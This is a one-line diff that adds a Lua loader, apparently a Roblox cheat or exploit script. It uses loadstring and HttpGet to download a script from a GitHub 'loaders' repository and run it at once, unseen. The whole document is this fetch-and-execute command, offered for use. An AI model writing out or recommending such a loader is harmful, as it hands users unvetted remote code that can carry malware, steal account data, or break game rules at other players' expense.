@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/1-speed-keyboard-escape-candy-chocolate-spam7-myi96rbniwy28r.lua"))()
